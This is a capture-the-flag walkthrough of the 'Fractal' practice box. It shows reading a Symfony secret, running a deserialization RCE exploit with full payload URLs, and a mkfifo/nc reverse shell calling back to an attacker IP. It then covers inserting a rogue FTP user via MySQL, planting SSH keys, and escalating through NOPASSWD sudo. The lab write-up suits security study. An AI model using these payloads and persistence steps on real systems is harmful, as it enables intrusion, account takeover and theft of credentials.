### Fractal Proving Ground Practice

### Difficulty = Hard

### IP Address = 192.168.88.233

Nmap Scan:

```
# Nmap 7.92 scan initiated Sun Jan 22 01:51:07 2023 as: nmap -sCV -A -p21,22,80 -oN Desktop/B2B/Pg/Practice/Fractal/nmapscan 192.168.88.233
Nmap scan report for 192.168.88.233
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 22 01:51:27 2023 -- 1 IP address (1 host up) scanned in 20.69 seconds
``` 

Checking ftp anonymous login is disabled

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Fractal]
└─$ ftp 192.168.88.233
Connected to 192.168.88.233.
220 ProFTPD Server (Debian) [192.168.88.233]
Name (192.168.88.233:mark): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> ^D
221 Goodbye.
```

Checking out the web server

It just shows this 
![image](https://user-images.githubusercontent.com/113513376/213896059-e0f9418b-94eb-4c9b-b1e3-e8bd0154ef5c.png)

Now nmap showed us a file which is app_dev.php

Lets check it out
![image](https://user-images.githubusercontent.com/113513376/213896156-8a903c01-aee7-49ac-ad8b-ecf5af2e9a4f.png)

It looks like the normal web page but it isn't 

There are now more functions there by looking below

Clicking the red version thing below leads here
![image](https://user-images.githubusercontent.com/113513376/213896185-df7ce978-f7e0-4825-9fa4-b79697f5866b.png)


Now we get something new 
![image](https://user-images.githubusercontent.com/113513376/213896480-7930ca4d-3d22-4179-a5ed-3b074cba2b64.png)

We see its running symfony profiler 3.4.46

Searching for exploits on google leads to this https://github.com/ambionics/symfony-exploits
![image](https://user-images.githubusercontent.com/113513376/213896501-1f8ee0b9-5e6e-4334-a329-be02a84ffc68.png)

Checking out the exploit 

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Fractal]
└─$ python3 exploit.py                                                                       
usage: exploit.py [-h] [-i INTERNAL_URL] [-s SECRET] [-a {sha1,sha256}] [-f FUNCTION] [-p [PARAMETERS ...]] [--ignore-original-status] [-m METHOD] url
exploit.py: error: the following arguments are required: url
```

While looking at the source code for the exploit i got this

```
#### METHOD 2
#
#  * Symfony\Component\Yaml\Inline::parse -> YAML -> unserialize()
#  * Recent versions (?)
#  * Requires Monolog
#  * Function takes one parameter only
#
# Example: Calls system('id'):
#
# $ ./symfony_fragment.php https://target.com/_fragment \
#   --internal-url http://target.internal.com/_fragment 
#   --secret 'CustomKey123!' \
#   --method 2
#   --function system
#   --parameters 'id'
#
``` 

So we can execute command but we need a secret key :(

Checking google for symfony exploits leads to this https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144

Where basically he was able to read the symfony configs 

And the config has a secret key in it 

So i'll reproduce this vulnerability to read the secret key which will then be used in the exploit
![image](https://user-images.githubusercontent.com/113513376/213896614-734f14e4-5a23-44c6-8b25-15c78f9cfff0.png)

```
# This file is auto-generated during the composer install
parameters:
    database_host: 127.0.0.1
    database_port: 3306
    database_name: symfony
    database_user: symfony
    database_password: symfony_db_password
    mailer_transport: smtp
    mailer_host: 127.0.0.1
    mailer_user: null
    mailer_password: null
    secret: 48a8538e6260789558f0dfe29861c05b
```

Now we have a secret key lets try out the exploit

```                                                                                                                                                                                                                 
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Fractal]
└─$ python3 exploit.py http://192.168.88.233/_fragment -s 48a8538e6260789558f0dfe29861c05b --method 2 --function system --parameters 'id'

Trying 4 mutations...
  (OK) sha256 48a8538e6260789558f0dfe29861c05b http://192.168.88.233/_fragment 404 http://192.168.88.233/_fragment?_path=&_hash=bAg8i3%2FaXDl1qJ8zn65LdLEqOrZFUn8lN7o1lziEUVc%3D
http://192.168.88.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522id%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=6LSsmP0FVtTajRA4yA4%2BQclm76LKOdxcJFwBX4IlXvg%3D
```

Now when i try to access this url we see the id command has been executed
![image](https://user-images.githubusercontent.com/113513376/213896688-5fc6e940-58e2-47e1-a8d0-8be3d8d2f65b.png)

So you know what to do 😸

Lets get shell

I'll use a bash reverse shell command

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Fractal]
└─$ python3 exploit.py http://192.168.88.233/_fragment -s 48a8538e6260789558f0dfe29861c05b --method 2 --function system --parameters 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.49.88 80 >/tmp/f'

Trying 4 mutations...
  (OK) sha256 48a8538e6260789558f0dfe29861c05b http://192.168.88.233/_fragment 404 http://192.168.88.233/_fragment?_path=&_hash=bAg8i3%2FaXDl1qJ8zn65LdLEqOrZFUn8lN7o1lziEUVc%3D
http://192.168.88.233/_fragment?_path=_controller%3DSymfony%255CComponent%255CYaml%255CInline%253A%253Aparse%26value%3D%2521php%252Fobject%2BO%253A32%253A%2522Monolog%255CHandler%255CSyslogUdpHandler%2522%253A1%253A%257Bs%253A9%253A%2522%2500%252A%2500socket%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BO%253A29%253A%2522Monolog%255CHandler%255CBufferHandler%2522%253A7%253A%257Bs%253A10%253A%2522%2500%252A%2500handler%2522%253BN%253Bs%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A2%253A%2522-1%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257Ds%253A13%253A%2522%2500%252A%2500bufferSize%2522%253Bi%253A-1%253Bs%253A9%253A%2522%2500%252A%2500buffer%2522%253Ba%253A1%253A%257Bi%253A0%253Ba%253A2%253A%257Bi%253A0%253Bs%253A80%253A%2522rm%2B%252Ftmp%252Ff%253Bmkfifo%2B%252Ftmp%252Ff%253Bcat%2B%252Ftmp%252Ff%257C%252Fbin%252Fbash%2B-i%2B2%253E%25261%257Cnc%2B192.168.49.88%2B80%2B%253E%252Ftmp%252Ff%2522%253Bs%253A5%253A%2522level%2522%253BN%253B%257D%257Ds%253A8%253A%2522%2500%252A%2500level%2522%253BN%253Bs%253A14%253A%2522%2500%252A%2500initialized%2522%253Bb%253A1%253Bs%253A14%253A%2522%2500%252A%2500bufferLimit%2522%253Bi%253A-1%253Bs%253A13%253A%2522%2500%252A%2500processors%2522%253Ba%253A2%253A%257Bi%253A0%253Bs%253A7%253A%2522current%2522%253Bi%253A1%253Bs%253A6%253A%2522system%2522%253B%257D%257D%257D%26exceptionOnInvalidType%3D0%26objectSupport%3D1%26objectForMap%3D0%26references%3D%26flags%3D516&_hash=msvLJ%2FVpmTP59TVPwdAHnvA4Al%2BSiZNY1IFMZh8PvDU%3D

```

Then navigating to it on the web browser and trying to access that url it hangs

But back on our listener we get a callback

```
┌──(mark__haxor)-[~]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.49.88] from (UNKNOWN) [192.168.88.233] 53336
bash: cannot set terminal process group (998): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fractal:/var/www/html/web$ 
```

Now lets stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

If we remember there was port 21 which is ftp running on the target

Checking for internal ports also shows that mysql is running

```
www-data@fractal:/var/www/html/web$ ss -tulnp
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:21           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*            
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
www-data@fractal:/var/www/html/web$ 

```

Lets see what we can get from the ftp config file

```
www-data@fractal:/$ cd /etc/proftpd/
www-data@fractal:/etc/proftpd$ ls
blacklist.dat  dhparams.pem  modules.conf  sql.conf  virtuals.conf
conf.d         ldap.conf     proftpd.conf  tls.conf
www-data@fractal:/etc/proftpd$ cat sql.conf 
<IfModule mod_sql.c>
SQLBackend mysql

#Passwords in MySQL are encrypted using CRYPT 
SQLAuthTypes OpenSSL Crypt
SQLAuthenticate users groups 

# used to connect to the database 
# databasename@host database_user user_password 
SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password

# Here we tell ProFTPd the names of the database columns in the "usertable" 
# we want it to interact with. Match the names with those in the db 
SQLUserInfo ftpuser userid passwd uid gid homedir shell 

# Here we tell ProFTPd the names of the database columns in the "grouptable" 
# we want it to interact with. Again the names match with those in the db
SQLGroupInfo ftpgroup groupname gid members 

# set min UID and GID - otherwise these are 999 each
SQLMinID 33

# Update count every time user logs in
SQLLog PASS updatecount
SQLNamedQuery updatecount UPDATE "count=count+1, accessed=now() WHERE userid='%u'" ftpuser

# Update modified everytime user uploads or deletes a file
SQLLog  STOR,DELE modified
SQLNamedQuery modified UPDATE "modified=now() WHERE userid='%u'" ftpuser

SqlLogFile /var/log/proftpd/sql.log
</IfModule>
www-data@fractal:/etc/proftpd$ 
```

We see the password and username for the mysql

Lets login and see what's in there

```
www-data@fractal:/etc/proftpd$ mysql -u proftpd -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 17
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| proftpd            |
+--------------------+
3 rows in set (0.03 sec)

mysql> use proftpd
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
    -> ;
+-------------------+
| Tables_in_proftpd |
+-------------------+
| ftpgroup          |
| ftpuser           |
+-------------------+
2 rows in set (0.01 sec)

mysql> select * from ftpuser;
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
| id | userid | passwd                        | uid | gid | homedir       | shell         | count | accessed            | modified            |
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |  33 |  33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+----+--------+-------------------------------+-----+-----+---------------+---------------+-------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> 
```

We see that its more of a configuration table

Which stores like ftp configuration and the password column stores its password by getting its md5hash then base64 encoding in a binary format

Lets try if we can add a user to the table 

And the user we would like to add in this cause is beniot

```
benoit:x:1000:1000::/home/benoit:/bin/sh
```

So lets try it out

But we need to create it in a way it matches what the web server requires

```
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Fractal]
└─$ echo {md5}`echo -n hacker | openssl dgst -binary -md5 | openssl enc -base64` 
{md5}1qa8DbEGlKLZDjppZI86Aw==
```

Now lets command to be inserted should be

```
INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('2', 'benoit', '{md5}1qa8DbEGlKLZDjppZI86Aw==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
```

Now lets insert it

```
mysql> INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('2', 'benoit', '{md5}1qa8DbEGlKLZDjppZI86Aw==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29'); 
Query OK, 1 row affected (0.01 sec)

mysql> select * from ftpuser;
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
| id | userid | passwd                        | uid  | gid  | homedir       | shell         | count | accessed            | modified            |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
|  1 | www    | {md5}RDLDFEKYiwjDGYuwpgb7Cw== |   33 |   33 | /var/www/html | /sbin/nologin |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
|  2 | benoit | {md5}1qa8DbEGlKLZDjppZI86Aw== | 1000 | 1000 | /             | /bin/bash     |     0 | 2022-09-27 05:26:29 | 2022-09-27 05:26:29 |
+----+--------+-------------------------------+------+------+---------------+---------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

mysql> 
```

So we can now try to login to ftp as user `benoit` with password `hacker`

```
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Fractal]
└─$ ftp 192.168.88.233
Connected to 192.168.88.233.
220 ProFTPD Server (Debian) [192.168.88.233]
Name (192.168.88.233:mark): benoit
331 Password required for benoit
Password: 
230 User benoit logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> cd /home
250 CWD command successful
ftp> dir
229 Entering Extended Passive Mode (|||30558|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 benoit   benoit       4096 Sep 27 05:26 benoit
226 Transfer complete
ftp> cd benoit
250 CWD command successful
ftp> dir
229 Entering Extended Passive Mode (|||22336|)
150 Opening ASCII mode data connection for file list
-r--r--r--   1 benoit   benoit         33 Jan 22 00:40 local.txt
226 Transfer complete
ftp> ls -al
229 Entering Extended Passive Mode (|||56078|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 benoit   benoit       4096 Sep 27 05:26 .
drwxr-xr-x   3 root     root         4096 Sep 27 05:26 ..
lrwxrwxrwx   1 root     root            9 Sep 27 05:26 .bash_history -> /dev/null
-rw-r--r--   1 benoit   benoit        220 Feb 25  2020 .bash_logout
-rw-r--r--   1 benoit   benoit       3771 Feb 25  2020 .bashrc
-r--r--r--   1 benoit   benoit         33 Jan 22 00:40 local.txt
-rw-r--r--   1 benoit   benoit        807 Feb 25  2020 .profile
226 Transfer complete
ftp> 
```

Now we have full access to the users directory

So i'll make a .ssh directory then put my id_rsa.pub key in it named as authorized_keys 

Then i will be able to ssh to the box as the user

```
──(mark__haxor)-[~]
└─$ cd .ssh                           
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ l
id_rsa  id_rsa.pub  known_hosts  known_hosts.old
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ cat id_rsa.pub                        
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor" > authorized_keys
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor
                                                                                                                                                                                                                   
┌──(mark__haxor)-[~/.ssh]
└─$ ftp 192.168.88.233
Connected to 192.168.88.233.
220 ProFTPD Server (Debian) [192.168.88.233]
Name (192.168.88.233:mark): benoit
331 Password required for benoit
Password: 
230 User benoit logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /home/benoit/.ssh
250 CWD command successful
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||36338|)
150 Opening BINARY mode data connection for authorized_keys
100% |**********************************************************************************************************************************************************************|   564        2.89 MiB/s    00:00 ETA
226 Transfer complete
564 bytes sent in 00:00 (2.69 KiB/s)
ftp> chmod 700 authorized_keys
200 SITE CHMOD command successful
ftp> 
```

Now we can login via ssh without no password

```
┌──(mark__haxor)-[~/.ssh]
└─$ ssh benoit@192.168.88.233
The authenticity of host '192.168.88.233 (192.168.88.233)' can't be established.
ED25519 key fingerprint is SHA256:D9EwlP6OBofTctv3nJ2YrEmwQrTfB9lLe4l8CqvcVDI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.88.233' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 22 Jan 2023 03:07:18 AM UTC

  System load:  0.07              Processes:               225
  Usage of /:   60.6% of 9.74GB   Users logged in:         0
  Memory usage: 63%               IPv4 address for ens160: 192.168.88.233
  Swap usage:   2%


0 updates can be applied immediately.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
local.txt
$ 
```

Checking sudo -l for privesc shows we can run ALL as root

```
$ sudo -l
Matching Defaults entries for benoit on fractal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User benoit may run the following commands on fractal:
    (ALL) NOPASSWD: ALL
$ 

```

Now we can easily su to root by doing sudo su

```
$ sudo su
root@fractal:/home/benoit# cd /root
root@fractal:~# ls -al
total 8656
drwx------  6 root root    4096 Jan 22 00:40 .
drwxr-xr-x 20 root root    4096 Jan  7  2021 ..
lrwxrwxrwx  1 root root       9 Sep 27 05:26 .bash_history -> /dev/null
-rw-r--r--  1 root root    3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root    4096 Sep 27 05:26 .config
drwxr-xr-x  3 root root    4096 Jan  7  2021 .local
-rw-r--r--  1 root root     161 Dec  5  2019 .profile
-r--------  1 root root      33 Jan 22 00:40 proof.txt
drwxr-xr-x  3 root root    4096 Jan  7  2021 snap
drwx------  2 root root    4096 Jan  7  2021 .ssh
-rw-r--r--  1 root root 8826015 Sep 21 19:30 symfony.tar.gz
root@fractal:~# 
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
<br>







